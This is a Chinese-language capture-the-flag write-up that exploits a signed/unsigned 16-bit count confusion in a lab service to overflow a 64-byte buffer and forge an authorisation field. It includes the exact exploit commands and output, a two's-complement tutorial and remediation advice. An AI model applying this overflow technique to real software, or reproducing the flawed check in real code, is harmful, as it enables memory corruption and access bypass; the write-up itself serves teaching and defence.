# CTF 练习：第九门 · 补码凭条（有符号/无符号混淆导致越界写）

> 平台：CTF² / Daily Hack（Pwn · 困难 · 500 分）
> 环境：Kali / PowerShell 直连 TLS raw TCP 服务
> 日期：2026-11-25
> 性质：平台提供的授权靶场

---

## 一、目标

一个 64 字节的「账页」，通过对话命令封存、审校、claim。要求：

- 印记 `[28..31]` 完好
- 授权字 `[32..35]` 为 `0x600d5eed`

两者同时满足才能 claim 出内库 flag。

## 二、协议

```
第 九 门 · 账 房 值 守 终 端
命令： talk   answer <值>   manual   audit
       preview <计数>   write <计数> <十六进制>
       claim   quit
```

每条新连接必须：

```
talk
answer -1        # 0xFFFF 的 16 位有符号真值
```

## 三、账页布局（manual）

```
[00..27] 笔记区，容量 28 字节
[28..31] 印记
[32..35] 授权字
[36..63] 余白

多字节字段小端
凭条计数写入 16 位补码字段；越界判断沿用「古老的比较惯例」
封存按计数搬运字节，来源不足补 0
印记完好且授权字 = 0x600d5eed → claim 可开内库
```

初始快照：

```
[16] 行: 00×12  ee ff c0 00
           ^^^^^^ [28..31] 印记 = 0x00c0ffee（小端）
[32] 行: 00 00 00 00   ← 授权字
```

## 四、漏洞确认

| 命令 | 结果 |
|---|---|
| `write 36 <hex>` | 「超过笔记区容量，拒收」（正数有检查） |
| `preview -4` | 「将以安全路径封存 0 字节」（预演有夹紧） |
| `write -4 41424344` | 「凭条读数 -4（16 位无符号 65532），搬运 65532 字节」 |
| `audit` | 前 4 字节 = 41 42 43 44，其余全 0（**印记被清零**） |

**根因**：同一个计数在「边界检查」时按 **16 位有符号** 解释（-4 ≤ 28，通过），
在「搬运」时按 **16 位无符号** 解释（65532 字节）。
预演命令走的是夹紧分支，所以看起来安全。

另外：任何 `write` 都会把整页清零再按凭条搬运，所以印记必须由我们自己写回。

## 四·五、推理链（为什么这么走）

### 第 1 步：为什么先做补码问答

- **我在想**：服务提示「只认凭条计数」「先答我一问」，不答不给账页。
- **验证**：`talk` → 问 `0xFFFF` 的 16 位有符号真值；`answer -1` 通过。
- **所以**：这是进入业务的门槛，与漏洞无关，但必须先过。

### 第 2 步：为什么正数 `write 36` 被拒

- **我在想**：容量 28，36 一定超。
- **验证**：`write 36 ...` → 「超过笔记区容量，拒收」。
- **所以**：检查存在，且对正数有效。

### 第 3 步：为什么试负数

- **我在想**：如果计数是 16 位有符号，`-4` 在内存里是 `0xFFFC`；如果检查用有符号比较，`-4 > 28` 为假 → 通过。
- **验证**：`write -4 41424344` → 「凭条读数 -4（16 位无符号 65532），搬运 65532 字节」。
- **所以**：检查有符号、搬运用无符号 —— 符号混淆成立。

### 第 4 步：为什么发现「印记被清零」

- **我在想**：溢出写入后，账页看着不对。
- **验证**：`write 4 41424344` 后 `audit`，`[28..31]` 的 `ee ff c0 00` 变 `00 00 00 00`。
- **所以**：封存是「先 memset 整页，再搬凭条」，印记必须自己写回。

### 第 5 步：为什么载荷要 36 字节

- **我在想**：要同时覆盖 `[28..31]` 和 `[32..35]`，源数据至少要 36 字节。
- **验证**：36 字节载荷 + `-1` 计数 → `audit` 显示印记与授权字都正确。
- **所以**：`claim` 成功。

## 五、利用

因为 `write` 会先清零整页，然后把「凭条内容」按顺序搬进账页，我们只要提供 **36 字节以上** 的凭条，就能同时覆盖印记和授权字：

```
[00..27] 28 字节  任意（00）
[28..31] ee ff c0 00    ← 印记原值（小端 0x00c0ffee）
[32..35] ed 5e 0d 60    ← 授权字（小端 0x600d5eed）
```

计数用 `-1`（无符号 65535）绕过容量检查：

```
talk
answer -1
write -1 00000000000000000000000000000000000000000000000000000000eeffc000ed5e0d60
audit
claim
```

`audit` 确认：

```
16: 00 00 00 00 00 00 00 00 00 00 00 00 ee ff c0 00
32: ed 5e 0d 60 ...
```

`claim` 输出：

```
内库门缓缓开启。
CTF2{0be1dd4e-b902-4163-9cf0-8bb4a35ec39e}
```

## 六、原理

| 点 | 说明 |
|---|---|
| 16 位补码 | 计数以 `int16` 存储，-1 = 0xFFFF |
| 符号混淆 | 检查用有符号，使用用无符号 → 负数变巨值 |
| 长度溢出 | 搬运长度 65535 > 64 字节账页 |
| 覆盖相邻字段 | 溢出写穿印记/授权字边界 |
| 伪造安全字段 | 把印记写回原值，授权字改成内库口令 |

## 六·五、知识点补课（第一次接触补码/整数溢出就看这里）

### 1. 十六进制和二进制怎么对应

一个十六进制字符 = 4 个二进制位：

```
F = 1111     0 = 0000
0xFFFF = 1111 1111 1111 1111   （16 位）
```

所以「16 位」就是 4 个十六进制字符，`0xFFFF` 正好写满 16 位。

### 2. 什么是补码

计算机用**补码**表示有符号整数：

- 最高位是**符号位**：0 正、1 负
- 负数 = 正数「按位取反再加 1」

```
 1  = 0000 0000 0000 0001
~1  = 1111 1111 1111 1110
+1  = 1111 1111 1111 1111  = 0xFFFF = -1
```

所以 **`0xFFFF` 作为 16 位有符号数就是 -1**。

16 位有符号的范围：

```
-32768 (0x8000)  ~  32767 (0x7FFF)
```

16 位无符号的范围：

```
0 (0x0000)  ~  65535 (0xFFFF)
```

**同一串二进制，读法不同，值就不同：**

| 位模式 | 有符号 `int16_t` | 无符号 `uint16_t` |
|---|---|---|
| `0xFFFF` | -1 | 65535 |
| `0x8000` | -32768 | 32768 |
| `0x7FFF` | 32767 | 32767 |

### 3. C 里的「有符号/无符号」陷阱

```c
int16_t  count = -1;      // 内部就是 0xFFFF
uint16_t n     = count;   // 0xFFFF 原样搬过去 → 65535
```

**赋值不会报错、不会截断，只是换了一种解释。**

本题的代码大致是：

```c
// 检查：按有符号比较
if (count > 28) { 拒收; }      // -1 > 28 为假 → 通过

// 搬运：按无符号当长度
size_t n = (uint16_t)count;    // 65535
for (size_t i = 0; i < n; i++)
    page[i] = (i < src_len) ? src[i] : 0;
```

一个变量、两种解释 —— 这就是漏洞的全部。

### 4. 为什么「来源不足补 0」

`src` 只有 4~36 字节，但循环要跑 65535 次。
`i >= src_len` 时没有数据可搬，程序就填 0。

所以账页看起来：

```
00: 41 42 43 44 00 00 ...   ← 前 4 字节是来源，其余补 0
```

### 5. 为什么印记会被清零（不是溢出写坏的）

`audit` 显示得很清楚：`write 4` 之后，`[28..31]` 的 `ee ff c0 00` 变成了 `00 00 00 00`。

原因：**封存 = 重建账页**

```c
memset(page, 0, 64);              // 先整页清零
copy_from_voucher(page, src, n);  // 再搬凭条
```

正常业务里 `n ≤ 28`，搬不到印记区，所以看起来「印记一直好好的」。
但只要 `n` 够大，印记就会被我们的数据覆盖；只要 `n < 28`，印记就会被清零。

**这不是我们写坏的，是封存动作本身就会清掉它。**
所以利用时必须**自己把印记 `ee ff c0 00` 写回去**。

### 6. 小端（little-endian）是什么

多字节整数在内存里「低位字节放前面」：

```
0x600d5eed  →  内存里依次是  ed 5e 0d 60
（低位 0xed 在前）
```

印记同理：

```
0x00c0ffee  →  ee ff c0 00
```

所以载荷里写 `eeffc000` 和 `ed5e0d60` 这两个顺序。

### 7. 载荷是怎么拼出来的（逐段对照）

```
write -1 <72 个 hex 字符>

[00..27] 28 字节   → 00 × 28 = 56 个 hex 字符
[28..31] 印记      → eeffc000
[32..35] 授权字    → ed5e0d60
```

拼起来：

```
00000000000000000000000000000000000000000000000000000000   ← 56 字符（28 字节 0）
eeffc000                                                   ← 8 字符（印记）
ed5e0d60                                                   ← 8 字符（授权字）
```

合计 72 个字符 = 36 字节。

### 8. 为什么 `preview` 看起来是安全的

`preview` 走的是**另一条分支**，会把计数夹紧到 `[0, 28]`：

```
preview -4   → 「将以安全路径封存 0 字节」
preview 32   → 「将以安全路径封存 0 字节」
```

预演分支做了范围裁剪，**真正的 `write` 分支没有**。
这是本题最阴的地方：**「预演安全」不代表「实操安全」**——一定要用真实命令验证。

### 9. 自测题（能答出来才算真懂）

**Q1**：`0xFFFE` 作为 16 位有符号数是多少？
**A**：-2（`0xFFFF` 是 -1，减 1）

**Q2**：`write -20 <36字节>` 会搬运多少字节？
**A**：`-20` 的补码是 `0xFFEC` = 65516 字节

**Q3**：为什么不能分两次 `write` 分别写印记和授权字？
**A**：每次 `write` 都会 `memset` 整页，第二次会把第一次的覆盖掉

**Q4**：授权字 `0x600d5eed` 在内存里是什么字节序？
**A**：`ed 5e 0d 60`（小端，低位在前）

**Q5**：如果目标缓冲区只有 64 字节，搬运 65535 字节会发生什么？
**A**：单次连接内会写穿栈/堆（本题服务做了保护或使用定长页，未崩溃）；
真实程序里通常直接崩溃或可控越界写，这也是它「危险」的原因

## 七、修复

1. **一处解析，处处使用同一类型**：计数只解析一次为无符号并做范围校验。
2. 所有解析结果都用 `size_t`/`uint16_t`，禁用 `int` 混用。
3. 拷贝前 `if (count > sizeof(buf)) return ERR;`，且用 `memcpy_s` 之类带界检查。
4. 预演与真实执行必须走**同一段代码**，避免「预演安全、实操溢出」。
5. 关键字段（印记/授权）放在独立结构或做完整性校验（MAC），不能只靠相邻布局。

## 八、失败尝试与坑

1. 每条新连接要先 `talk` 再 `answer`，否则一直回「先坐下说话」。
2. `preview` 的夹紧分支会误导——真正跑 `write` 才看到溢出。
3. 任何 `write` 都会清零整页，**印记必须自己写回**。
4. 首字节 `17 03 03` 是 TLS 记录头，解析时要跳过。

## 九、收获

- 亲手验证了「有符号检查 + 无符号搬用」这类经典整数漏洞。
- 理解了「预演分支安全 ≠ 实操安全」。
- 学会了用 PowerShell 的 `SslStream` 直接驱动 raw TLS 服务，避免依赖终端交互。
